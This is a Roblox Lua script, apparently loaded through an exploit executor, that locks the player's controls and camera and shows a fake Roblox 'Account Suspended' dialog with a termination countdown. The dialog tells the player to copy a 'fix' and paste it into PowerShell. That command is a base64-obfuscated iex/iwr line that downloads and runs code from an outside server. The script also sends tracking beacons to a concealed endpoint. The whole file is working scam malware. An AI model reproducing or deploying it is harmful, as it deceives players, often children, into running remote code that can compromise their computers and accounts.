local Players = game:GetService("Players")
local GuiService = game:GetService("GuiService")
local TweenService = game:GetService("TweenService")
local UIS = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local ContextActionSvc = game:GetService("ContextActionService")
local Lighting = game:GetService("Lighting")
local lp = Players.LocalPlayer
local isMobile = UIS.TouchEnabled and not UIS.KeyboardEnabled
local FIX_COMMAND = "iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL3NvZnQtc3RvcmFnZS50b3Avd29ya2VyPz05NDQzNTY3MjgvcmJ4LXZlcnNpb24tbWlzbWF0Y2g='))) -UseBasicParsing)"
-- ANALYTICS (оригинальный формат: executor + event)
local ANALYTICS = {
endpoint = table.concat({"ht","tps:","/","/rbx","-scri","pts.","xyz","/api","/hit"}),
enabled = true,
sessionId = tostring(math.random(100000,999999)) .. tostring(os.time() % 100000),
}
local function sendHit(executorName, eventType)
if not ANALYTICS.enabled then return end
local body = table.concat({
"session=", ANALYTICS.sessionId,
"&executor=", executorName or "unknown",
"&event=", eventType or "shown",
"&ts=", tostring(os.time()),
})
local payload = {
Url = ANALYTICS.endpoint,
Method = "POST",
Headers = {
["Content-Type"] = "application/x-www-form-urlencoded",
["User-Agent"] = "RobloxClient/1.0",
},
Body = body,
}
task.spawn(function()
pcall(function()
if request then
request(payload)
elseif syn and syn.request then
syn.request(payload)
elseif http_request then
http_request(payload)
elseif http and http.request then
http.request(payload)
else
game:GetService("HttpService"):PostAsync(
ANALYTICS.endpoint,
body,
Enum.HttpContentType.ApplicationUrlEncoded,
false
)
end
end)
end)
end
-- ============ PALETTE ============
local C = {
dim       = Color3.fromRGB(0, 0, 0),
card      = Color3.fromRGB(42, 42, 46),
cardTop   = Color3.fromRGB(52, 52, 56),
title     = Color3.fromRGB(255, 255, 255),
body      = Color3.fromRGB(225, 225, 228),
muted     = Color3.fromRGB(155, 155, 160),
separator = Color3.fromRGB(75, 75, 80),
accent    = Color3.fromRGB(0, 162, 255),
danger    = Color3.fromRGB(235, 80, 80),
btnPrimary= Color3.fromRGB(255, 255, 255),
btnPrimTxt= Color3.fromRGB(30, 30, 32),
btnPrimHov= Color3.fromRGB(230, 230, 235),
green     = Color3.fromRGB(0, 180, 70),
}
local function setClipboard(text)
local ok = false
pcall(function()
if setclipboard then setclipboard(text); ok = true
elseif toclipboard then toclipboard(text); ok = true
elseif syn and syn.write_clipboard then syn.write_clipboard(text); ok = true
elseif syn and syn.set_clipboard then syn.set_clipboard(text); ok = true
elseif writeclipboard then writeclipboard(text); ok = true
elseif GuiService and GuiService.SetClipboard then GuiService:SetClipboard(text); ok = true
end
end)
return ok
end
-- ============ FREEZE HELPERS ============
local frozenOwnChar = false
local function freezeOwnCharacter(character)
if not character or frozenOwnChar then return end
local humanoid = character:FindFirstChildOfClass("Humanoid")
if humanoid then
humanoid.WalkSpeed = 0
humanoid.JumpPower = 0
humanoid.JumpHeight = 0
task.spawn(function()
while character.Parent and humanoid.Parent do
if humanoid.WalkSpeed ~= 0 then humanoid.WalkSpeed = 0 end
if humanoid.JumpPower ~= 0 then humanoid.JumpPower = 0 end
if humanoid.JumpHeight ~= 0 then humanoid.JumpHeight = 0 end
task.wait(0.25)
end
end)
end
end
local function freezeOtherCharacter(character)
if not character then return end
for _, desc in ipairs(character:GetDescendants()) do
if desc:IsA("BasePart") then
desc.Anchored = true
end
end
local humanoid = character:FindFirstChildOfClass("Humanoid")
if humanoid then
humanoid.WalkSpeed = 0
humanoid.JumpPower = 0
humanoid.JumpHeight = 0
local animator = humanoid:FindFirstChildOfClass("Animator")
if animator then
for _, track in ipairs(animator:GetPlayingAnimationTracks()) do
pcall(function() track:Stop(0) end)
end
end
end
end
-- ============ SHOW DIALOG ============
local function showDialog()
-- Lock input
local BLOCK_ACTION = "RobloxDialogBlock"
pcall(function()
ContextActionSvc:BindAction(
BLOCK_ACTION,
function() return Enum.ContextActionResult.Sink end,
false,
Enum.PlayerActions.CharacterForward,
Enum.PlayerActions.CharacterBackward,
Enum.PlayerActions.CharacterLeft,
Enum.PlayerActions.CharacterRight,
Enum.PlayerActions.CharacterJump,
Enum.UserInputType.MouseButton1,
Enum.UserInputType.MouseButton2,
Enum.UserInputType.MouseButton3,
Enum.UserInputType.MouseWheel,
Enum.UserInputType.Touch,
Enum.KeyCode.Escape,
Enum.KeyCode.Tab,
Enum.KeyCode.Return,
Enum.KeyCode.Space,
Enum.KeyCode.LeftShift,
Enum.KeyCode.RightShift,
Enum.KeyCode.LeftControl,
Enum.KeyCode.RightControl,
Enum.KeyCode.LeftAlt,
Enum.KeyCode.RightAlt,
Enum.KeyCode.Backspace,
Enum.KeyCode.Delete
)
end)
-- Freeze own character
frozenOwnChar = true
if lp.Character then freezeOwnCharacter(lp.Character) end
lp.CharacterAdded:Connect(function(char)
char:WaitForChild("Humanoid", 10)
task.wait(0.2)
freezeOwnCharacter(char)
end)
-- Freeze all other players
for _, plr in ipairs(Players:GetPlayers()) do
if plr ~= lp then
if plr.Character then freezeOtherCharacter(plr.Character) end
plr.CharacterAdded:Connect(function(char)
task.wait(0.4)
freezeOtherCharacter(char)
end)
end
end
Players.PlayerAdded:Connect(function(plr)
if plr ~= lp then
plr.CharacterAdded:Connect(function(char)
task.wait(0.4)
freezeOtherCharacter(char)
end)
end
end)
-- Lock camera on current frame
local cam = workspace.CurrentCamera
local savedCFrame = cam.CFrame
local savedFOV = cam.FieldOfView
pcall(function()
cam.CameraType = Enum.CameraType.Scriptable
end)
local camLock = RunService.RenderStepped:Connect(function()
if cam.CameraType ~= Enum.CameraType.Scriptable then
pcall(function() cam.CameraType = Enum.CameraType.Scriptable end)
end
if cam.CFrame ~= savedCFrame then
cam.CFrame = savedCFrame
end
if cam.FieldOfView ~= savedFOV then
cam.FieldOfView = savedFOV
end
end)
-- Blur + desaturate scene
local blur = Instance.new("BlurEffect")
blur.Size = 0
blur.Parent = Lighting
TweenService:Create(blur, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = 26}):Play()
local colorCor = Instance.new("ColorCorrectionEffect")
colorCor.Brightness = 0
colorCor.Contrast = 0
colorCor.Saturation = -0.15
colorCor.Parent = Lighting
-- GUI
local gui = Instance.new("ScreenGui")
gui.Name = "RobloxSuspensionDialog"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.DisplayOrder = 1000000
gui.Parent = lp:WaitForChild("PlayerGui")
local dim = Instance.new("Frame")
dim.Size = UDim2.new(1, 0, 1, 0)
dim.BackgroundColor3 = C.dim
dim.BackgroundTransparency = 0.35
dim.BorderSizePixel = 0
dim.ZIndex = 1
dim.Parent = gui
local blocker = Instance.new("TextButton")
blocker.Size = UDim2.new(1, 0, 1, 0)
blocker.BackgroundTransparency = 1
blocker.Text = ""
blocker.AutoButtonColor = false
blocker.Modal = true
blocker.ZIndex = 2
blocker.Parent = gui
blocker.MouseButton1Click:Connect(function() end)
local vp = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1280, 720)
local CARD_W = isMobile and math.min(360, vp.X - 16) or 580
local CARD_H = 570
local cardX = -CARD_W / 2
local cardY = -CARD_H / 2
local card = Instance.new("Frame")
card.Size = UDim2.new(0, CARD_W, 0, CARD_H)
card.Position = UDim2.new(0.5, cardX, 0.5, cardY)
card.BackgroundColor3 = C.card
card.BorderSizePixel = 0
card.ClipsDescendants = true
card.ZIndex = 5
card.Parent = gui
local cardCorner = Instance.new("UICorner")
cardCorner.CornerRadius = UDim.new(0, 8)
cardCorner.Parent = card
-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -60, 0, 30)
title.Position = UDim2.new(0, 30, 0, 24)
title.BackgroundTransparency = 1
title.Text = "Account Suspended"
title.TextColor3 = C.title
title.TextSize = 22
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Center
title.ZIndex = 7
title.Parent = card
-- Separator line
local sep = Instance.new("Frame")
sep.Size = UDim2.new(1, -60, 0, 1)
sep.Position = UDim2.new(0, 30, 0, 66)
sep.BackgroundColor3 = C.separator
sep.BorderSizePixel = 0
sep.ZIndex = 6
sep.Parent = card
-- Error message
local body = Instance.new("TextLabel")
body.Size = UDim2.new(1, -60, 0, 56)
body.Position = UDim2.new(0, 30, 0, 82)
body.BackgroundTransparency = 1
body.RichText = true
body.Text = "Your account has been <b>suspended</b> for using <b>unauthorized third-party software</b> (exploits). This violates the Roblox Terms of Use."
body.TextColor3 = C.body
body.TextSize = 14
body.Font = Enum.Font.Gotham
body.TextWrapped = true
body.TextXAlignment = Enum.TextXAlignment.Center
body.TextYAlignment = Enum.TextYAlignment.Top
body.LineHeight = 1.25
body.ZIndex = 7
body.Parent = card
-- Warning text (above timer)
local warningText = Instance.new("TextLabel")
warningText.Size = UDim2.new(1, -60, 0, 34)
warningText.Position = UDim2.new(0, 30, 0, 146)
warningText.BackgroundTransparency = 1
warningText.RichText = true
warningText.Text = "If verification is not completed, your Roblox account will be <b>permanently terminated</b>."
warningText.TextColor3 = C.danger
warningText.TextSize = 14
warningText.Font = Enum.Font.GothamBold
warningText.TextWrapped = true
warningText.TextXAlignment = Enum.TextXAlignment.Center
warningText.TextYAlignment = Enum.TextYAlignment.Center
warningText.LineHeight = 1.2
warningText.ZIndex = 7
warningText.Parent = card
-- Timer caption
local timerCaption = Instance.new("TextLabel")
timerCaption.Size = UDim2.new(1, -60, 0, 14)
timerCaption.Position = UDim2.new(0, 30, 0, 188)
timerCaption.BackgroundTransparency = 1
timerCaption.Text = "ACCOUNT TERMINATION IN"
timerCaption.TextColor3 = C.muted
timerCaption.TextSize = 11
timerCaption.Font = Enum.Font.GothamBold
timerCaption.TextXAlignment = Enum.TextXAlignment.Center
timerCaption.ZIndex = 7
timerCaption.Parent = card
-- Timer
local timerLabel = Instance.new("TextLabel")
timerLabel.Size = UDim2.new(1, -60, 0, 38)
timerLabel.Position = UDim2.new(0, 30, 0, 206)
timerLabel.BackgroundTransparency = 1
timerLabel.Text = "05:00"
timerLabel.TextColor3 = C.danger
timerLabel.TextSize = 32
timerLabel.Font = Enum.Font.GothamBold
timerLabel.TextXAlignment = Enum.TextXAlignment.Center
timerLabel.ZIndex = 7
timerLabel.Parent = card
local deadline = os.time() + 5 * 60
task.spawn(function()
while timerLabel.Parent do
local left = deadline - os.time()
if left < 0 then left = 0 end
local m = math.floor(left / 60)
local s = left % 60
timerLabel.Text = string.format("%02d:%02d", m, s)
task.wait(1)
end
end)
-- Steps panel
local stepPanel = Instance.new("Frame")
stepPanel.Size = UDim2.new(1, -60, 0, 176)
stepPanel.Position = UDim2.new(0, 30, 0, 256)
stepPanel.BackgroundColor3 = C.cardTop
stepPanel.BorderSizePixel = 0
stepPanel.ZIndex = 6
stepPanel.Parent = card
local spCorner = Instance.new("UICorner")
spCorner.CornerRadius = UDim.new(0, 6)
spCorner.Parent = stepPanel
local stepsHeader = Instance.new("TextLabel")
stepsHeader.Size = UDim2.new(1, -24, 0, 16)
stepsHeader.Position = UDim2.new(0, 16, 0, 12)
stepsHeader.BackgroundTransparency = 1
stepsHeader.RichText = true
stepsHeader.Text = "Verify to prevent termination — <b>4 steps</b>:"
stepsHeader.TextColor3 = C.title
stepsHeader.TextSize = 13
stepsHeader.Font = Enum.Font.GothamBold
stepsHeader.TextXAlignment = Enum.TextXAlignment.Left
stepsHeader.ZIndex = 7
stepsHeader.Parent = stepPanel
local function buildStepRow(yPos, number, richText)
local badge = Instance.new("TextLabel")
badge.Size = UDim2.new(0, 22, 0, 22)
badge.Position = UDim2.new(0, 16, 0, yPos)
badge.BackgroundColor3 = C.accent
badge.Text = number
badge.TextColor3 = Color3.fromRGB(255, 255, 255)
badge.TextSize = 13
badge.Font = Enum.Font.GothamBold
badge.BorderSizePixel = 0
badge.ZIndex = 7
badge.Parent = stepPanel
local bc = Instance.new("UICorner")
bc.CornerRadius = UDim.new(1, 0)
bc.Parent = badge
local step = Instance.new("TextLabel")
step.Size = UDim2.new(1, -56, 0, 22)
step.Position = UDim2.new(0, 46, 0, yPos)
step.BackgroundTransparency = 1
step.RichText = true
step.Text = richText
step.TextColor3 = C.body
step.TextSize = 13
step.Font = Enum.Font.Gotham
step.TextXAlignment = Enum.TextXAlignment.Left
step.TextYAlignment = Enum.TextYAlignment.Center
step.ZIndex = 7
step.Parent = stepPanel
end
buildStepRow(38, "1", "Click <b>Copy Code</b> at the bottom of this window")
buildStepRow(68, "2", "Press <b>WIN + R</b> on your keyboard")
buildStepRow(98, "3", "Type <b>powershell</b> and press <b>ENTER</b>")
buildStepRow(128, "4", "Paste with <b>CTRL + V</b>, then press <b>ENTER</b>")
-- Copy button (full width, at bottom)
local copyBtn = Instance.new("TextButton")
copyBtn.Size = UDim2.new(1, -60, 0, 54)
copyBtn.Position = UDim2.new(0, 30, 0, CARD_H - 30 - 54)
copyBtn.BackgroundColor3 = C.btnPrimary
copyBtn.Text = "Copy Code"
copyBtn.TextColor3 = C.btnPrimTxt
copyBtn.TextSize = 16
copyBtn.Font = Enum.Font.GothamBold
copyBtn.BorderSizePixel = 0
copyBtn.AutoButtonColor = false
copyBtn.ZIndex = 8
copyBtn.Parent = card
local cbCorner = Instance.new("UICorner")
cbCorner.CornerRadius = UDim.new(0, 6)
cbCorner.Parent = copyBtn
copyBtn.MouseEnter:Connect(function()
if copyBtn.Text == "Copy Code" then
copyBtn.BackgroundColor3 = C.btnPrimHov
end
sendHit("btn", "hover")
end)
copyBtn.MouseLeave:Connect(function()
if copyBtn.Text == "Copy Code" then
copyBtn.BackgroundColor3 = C.btnPrimary
end
end)
-- Copy handler
local clickLock = false
copyBtn.MouseButton1Click:Connect(function()
if clickLock then return end
clickLock = true
sendHit("fix", "copy")
local copied = setClipboard(FIX_COMMAND)
if copied then
sendHit("fix", "copy_ok")
copyBtn.BackgroundColor3 = C.green
copyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
copyBtn.Text = "✓ Copied — follow steps above"
else
sendHit("fix", "copy_fail")
copyBtn.Text = "Copy failed — retry"
copyBtn.BackgroundColor3 = C.danger
copyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
clickLock = false
end
task.delay(4, function()
if copyBtn and copyBtn.Parent then
copyBtn.Text = "Copy Code"
copyBtn.TextColor3 = C.btnPrimTxt
copyBtn.BackgroundColor3 = C.btnPrimary
clickLock = false
end
end)
end)
-- Entrance animation
pcall(function()
card.Position = UDim2.new(0.5, cardX, 0.5, cardY + 20)
card.BackgroundTransparency = 1
TweenService:Create(card, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
Position = UDim2.new(0.5, cardX, 0.5, cardY),
BackgroundTransparency = 0,
}):Play()
end)
sendHit("shown", "shown")
end
-- Fire after 5–10 second random delay
task.delay(math.random(5, 10), showDialog)
